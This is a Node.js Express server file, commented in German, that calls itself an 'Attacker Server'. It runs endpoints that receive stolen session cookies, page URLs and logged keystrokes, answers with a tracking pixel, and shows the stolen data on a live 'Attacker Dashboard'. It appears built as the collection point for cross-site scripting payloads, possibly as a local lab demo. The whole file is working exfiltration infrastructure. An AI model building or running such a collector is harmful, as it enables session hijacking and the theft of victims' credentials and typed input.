const express = require('express');
const cors = require('cors');
const app = express();
const port = 3000;

// Enable CORS für alle Origins
app.use(cors());
app.use(express.json());
app.use(express.urlencoded({ extended: true }));

// Logging Middleware
app.use((req, res, next) => {
    console.log(`\n[${new Date().toLocaleString('de-DE')}] ${req.method} ${req.url}`);
    next();
});

// Gestohlene Daten Array
let stolenData = [];

// Cookie Steal Endpoint (GET)
app.get('/steal', (req, res) => {
    const cookies = req.query.c;
    const timestamp = new Date().toLocaleString('de-DE');

    console.log('\n🚨 COOKIES GESTOHLEN! 🚨');
    console.log('═'.repeat(50));
    console.log(`Zeitpunkt: ${timestamp}`);
    console.log(`Cookies: ${cookies}`);
    console.log(`IP: ${req.ip}`);
    console.log(`User-Agent: ${req.headers['user-agent']}`);
    console.log('═'.repeat(50));

    stolenData.push({
        type: 'cookies',
        data: cookies,
        timestamp: timestamp,
        ip: req.ip,
        userAgent: req.headers['user-agent']
    });

    // Sende 1x1 transparentes Pixel zurück
    res.set('Content-Type', 'image/gif');
    res.send(Buffer.from('R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7', 'base64'));
});

// Cookie Steal Endpoint (POST) - für komplexere Daten
app.post('/steal', (req, res) => {
    const data = req.body;
    const timestamp = new Date().toLocaleString('de-DE');

    console.log('\n🚨 DATEN GESTOHLEN! 🚨');
    console.log('═'.repeat(50));
    console.log(`Zeitpunkt: ${timestamp}`);
    console.log(`Cookies: ${data.c}`);
    console.log(`URL: ${data.u}`);
    console.log(`User-Agent: ${data.a}`);
    console.log(`IP: ${req.ip}`);
    console.log('═'.repeat(50));

    stolenData.push({
        type: 'full_data',
        cookies: data.c,
        url: data.u,
        userAgent: data.a,
        timestamp: timestamp,
        ip: req.ip
    });

    res.json({ status: 'success' });
});

// Keylogger Endpoint
app.get('/keys', (req, res) => {
    const keys = req.query.d;
    const timestamp = new Date().toLocaleString('de-DE');

    console.log('\n⌨️  TASTATUREINGABEN AUFGEZEICHNET! ⌨️');
    console.log('═'.repeat(50));
    console.log(`Zeitpunkt: ${timestamp}`);
    console.log(`Eingaben: "${keys}"`);
    console.log(`IP: ${req.ip}`);
    console.log('═'.repeat(50));

    stolenData.push({
        type: 'keylogger',
        keys: keys,
        timestamp: timestamp,
        ip: req.ip
    });

    res.set('Content-Type', 'image/gif');
    res.send(Buffer.from('R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7', 'base64'));
});

// Dashboard - Zeigt alle gestohlenen Daten
app.get('/dashboard', (req, res) => {
    res.send(`
        <!DOCTYPE html>
        <html lang="de">
        <head>
            <meta charset="UTF-8">
            <meta name="viewport" content="width=device-width, initial-scale=1.0">
            <title>Attacker Dashboard</title>
            <style>
                * { margin: 0; padding: 0; box-sizing: border-box; }
                body {
                    font-family: 'Courier New', monospace;
                    background: #0a0a0a;
                    color: #00ff00;
                    padding: 20px;
                }
                .container {
                    max-width: 1200px;
                    margin: 0 auto;
                }
                h1 {
                    text-align: center;
                    padding: 20px;
                    border: 2px solid #00ff00;
                    margin-bottom: 30px;
                    text-transform: uppercase;
                    letter-spacing: 3px;
                }
                .stats {
                    display: grid;
                    grid-template-columns: repeat(auto-fit, minmax(200px, 1fr));
                    gap: 20px;
                    margin-bottom: 30px;
                }
                .stat-box {
                    border: 2px solid #00ff00;
                    padding: 20px;
                    text-align: center;
                }
                .stat-number {
                    font-size: 48px;
                    font-weight: bold;
                }
                .stat-label {
                    font-size: 14px;
                    margin-top: 10px;
                    opacity: 0.7;
                }
                .data-entry {
                    border: 1px solid #00ff00;
                    padding: 20px;
                    margin-bottom: 15px;
                    background: #0f0f0f;
                }
                .data-type {
                    display: inline-block;
                    padding: 5px 10px;
                    background: #00ff00;
                    color: #0a0a0a;
                    font-weight: bold;
                    margin-bottom: 10px;
                }
                .data-field {
                    margin: 10px 0;
                    padding: 10px;
                    background: #1a1a1a;
                    border-left: 3px solid #00ff00;
                }
                .data-label {
                    color: #00ff00;
                    font-weight: bold;
                }
                .data-value {
                    color: #33ff33;
                    word-break: break-all;
                }
                .timestamp {
                    color: #888;
                    font-size: 12px;
                }
                .clear-btn {
                    display: block;
                    width: 200px;
                    margin: 20px auto;
                    padding: 15px;
                    background: #ff0000;
                    color: white;
                    border: none;
                    cursor: pointer;
                    font-family: 'Courier New', monospace;
                    font-weight: bold;
                    text-transform: uppercase;
                }
                .clear-btn:hover {
                    background: #cc0000;
                }
                .no-data {
                    text-align: center;
                    padding: 60px;
                    border: 2px dashed #00ff00;
                    opacity: 0.5;
                }
            </style>
            <script>
                function clearData() {
                    if (confirm('Alle gestohlenen Daten löschen?')) {
                        fetch('/clear', { method: 'POST' })
                            .then(() => location.reload());
                    }
                }
                // Auto-refresh alle 5 Sekunden
                setTimeout(() => location.reload(), 5000);
            </script>
        </head>
        <body>
            <div class="container">
                <h1>🚨 Attacker Dashboard 🚨</h1>

                <div class="stats">
                    <div class="stat-box">
                        <div class="stat-number">${stolenData.length}</div>
                        <div class="stat-label">Gesamt Einträge</div>
                    </div>
                    <div class="stat-box">
                        <div class="stat-number">${stolenData.filter(d => d.type === 'cookies' || d.type === 'full_data').length}</div>
                        <div class="stat-label">Gestohlene Cookies</div>
                    </div>
                    <div class="stat-box">
                        <div class="stat-number">${stolenData.filter(d => d.type === 'keylogger').length}</div>
                        <div class="stat-label">Keylogger Einträge</div>
                    </div>
                </div>

                ${stolenData.length === 0 ?
                    '<div class="no-data">Noch keine Daten gestohlen...</div>' :
                    stolenData.slice().reverse().map(entry => `
                        <div class="data-entry">
                            <span class="data-type">${entry.type.toUpperCase()}</span>
                            <span class="timestamp">${entry.timestamp}</span>

                            ${entry.type === 'cookies' ? `
                                <div class="data-field">
                                    <div class="data-label">Cookies:</div>
                                    <div class="data-value">${entry.data}</div>
                                </div>
                            ` : ''}

                            ${entry.type === 'full_data' ? `
                                <div class="data-field">
                                    <div class="data-label">Cookies:</div>
                                    <div class="data-value">${entry.cookies}</div>
                                </div>
                                <div class="data-field">
                                    <div class="data-label">URL:</div>
                                    <div class="data-value">${entry.url}</div>
                                </div>
                                <div class="data-field">
                                    <div class="data-label">User-Agent:</div>
                                    <div class="data-value">${entry.userAgent}</div>
                                </div>
                            ` : ''}

                            ${entry.type === 'keylogger' ? `
                                <div class="data-field">
                                    <div class="data-label">Tastatureingaben:</div>
                                    <div class="data-value">"${entry.keys}"</div>
                                </div>
                            ` : ''}

                            <div class="data-field">
                                <div class="data-label">IP:</div>
                                <div class="data-value">${entry.ip}</div>
                            </div>
                            ${entry.userAgent ? `
                                <div class="data-field">
                                    <div class="data-label">User-Agent:</div>
                                    <div class="data-value">${entry.userAgent}</div>
                                </div>
                            ` : ''}
                        </div>
                    `).join('')
                }

                <button class="clear-btn" onclick="clearData()">🗑️ Daten löschen</button>

                <p style="text-align: center; opacity: 0.5; margin-top: 20px;">
                    Auto-Refresh in 5 Sekunden...
                </p>
            </div>
        </body>
        </html>
    `);
});

// Clear all stolen data
app.post('/clear', (req, res) => {
    stolenData = [];
    console.log('\n🗑️  Alle gestohlenen Daten wurden gelöscht\n');
    res.json({ status: 'cleared' });
});

// Health check
app.get('/', (req, res) => {
    res.send(`
        <h1>Attacker Server läuft!</h1>
        <p>Gehe zu <a href="/dashboard">/dashboard</a> um gestohlene Daten zu sehen</p>
        <ul>
            <li>Cookie Steal: GET /steal?c=cookies</li>
            <li>Full Data Steal: POST /steal (JSON: {c, u, a})</li>
            <li>Keylogger: GET /keys?d=keys</li>
        </ul>
    `);
});

app.listen(port, () => {
    console.clear();
    console.log('\n' + '═'.repeat(50));
    console.log('  ATTACKER SERVER GESTARTET  '.padStart(35));
    console.log('═'.repeat(50));
    console.log(`\nServer läuft auf: http://localhost:${port}`);
    console.log(`Dashboard: http://localhost:${port}/dashboard`);
    console.log('\nEndpoints:');
    console.log(`  - GET  /steal?c=<cookies>`);
    console.log(`  - POST /steal (JSON)`);
    console.log(`  - GET  /keys?d=<keystrokes>`);
    console.log(`  - GET  /dashboard`);
    console.log('\n' + '═'.repeat(50) + '\n');
    console.log('Warte auf gestohlene Daten...\n');
});
